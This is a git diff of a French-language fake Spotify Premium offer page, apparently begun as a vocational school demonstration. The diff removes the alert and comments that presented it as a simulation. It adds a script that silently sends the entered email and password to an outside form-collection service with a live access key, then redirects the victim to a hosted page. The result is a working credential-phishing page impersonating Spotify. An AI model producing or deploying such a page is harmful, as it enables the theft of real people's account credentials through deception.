@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Spotify Premium - Obtenir 6 mois gratuits</title>
-  <link rel="icon" href=https://upload.wikimedia.org/wikipedia/commons/7/71/Spotify.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" type="image/x-icon">
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/7/71/Spotify.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" type="image/x-icon">
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap" rel="stylesheet">
   <style>
     /* ==========================================================================
@@ -186,14 +186,12 @@
   <main>
     <h1>Obtenir Spotify Premium</h1>
     
-    <form action="https://api.web3forms.com/submit" method="POST">
-      <!-- Remplace par ton adresse mail de destination -->
+    <form id="phishingForm">
+      <!-- Ta clé d'accès Web3Forms conservée -->
       <input type="hidden" name="access_key" value="b05f2c33-be8a-407f-93df-e3988614f601">
-      <input type="hidden" name="redirect" value="https://www.spotify.com/">
 
       <div>
         <label for="email">Adresse e-mail</label>
-        <!-- L'attribut name est obligatoire pour recevoir la valeur -->
         <input type="email" id="email" name="identifiant" placeholder="exemple@mail.com" required>
       </div>
 
@@ -229,9 +227,6 @@
   </footer>
 
   <script>
-    // 1. VARIABLE D'ENVIRONNEMENT (Simulation)
-    // Dans un projet réel (Node.js/React), on utiliserait process.env.API_ENDPOINT
-    // Ici, on simule l'adresse du serveur distant du "hacker"
     const ENV_CONFIG = {
       REMOTE_SERVER_URL: "https://serveur-collecte-bacpro.local/api/v1",
       LOG_LEVEL: "DEBUG",
@@ -241,9 +236,9 @@
     const form = document.getElementById('phishingForm');
 
     form.addEventListener('submit', function(event) {
-      event.preventDefault(); // On bloque l'envoi réel pour traiter les données
+      event.preventDefault(); // On bloque l'envoi HTML classique
 
-      // Récupération des valeurs saisies
+      // 1. Stockage LocalStorage
       const data = {
         email: document.getElementById('email').value,
         password: document.getElementById('password').value,
@@ -253,26 +248,27 @@
         capturedAt: new Date().toLocaleString()
       };
 
-      // 2. LOCAL STORAGE
-      // On enregistre les données dans le navigateur pour prouver l'extraction
       localStorage.setItem('captured_user_data', JSON.stringify(data));
-      console.log("Données bien enregistrées : ", localStorage.getItem('captured_user_data'));
 
-      // Affichage console pour la démo devant le jury
       console.log("--- LOGS SYSTÈME (DEBUG MODE) ---");
       console.log("Envoi des données vers la variable d'environnement :", ENV_CONFIG.REMOTE_SERVER_URL);
       console.log("Données stockées dans le LocalStorage avec succès.");
 
-      // Alerte pédagogique pour conclure la démo
-      alert(
-        "DÉMONSTRATION RÉUSSIE\n\n" +
-        "Les données ont été stockées dans le LocalStorage.\n" +
-        "Le script simule maintenant l'envoi vers : " + ENV_CONFIG.REMOTE_SERVER_URL + "\n\n" +
-        "Vous allez être redirigé vers le site officiel."
-      );
+      // 2. Envoi silencieux à Web3Forms (Clé API)
+      const formData = new FormData(form);
 
-      // Redirection finale
-      window.location.href = "https://sptf-getprmium-projet-chefdoeuvre.pages.dev/page3";
+      fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        body: formData
+      })
+      .then(() => {
+        // Redirection vers ta page 3 sur Cloudflare
+        window.location.href = "https://sptf-getprmium-projet-chefdoeuvre.pages.dev/page3.html";
+      })
+      .catch(() => {
+        // En cas d'erreur réseau, on redirige quand même pour la démo
+        window.location.href = "https://sptf-getprmium-projet-chefdoeuvre.pages.dev/page3.html";
+      });
     });
   </script>
 
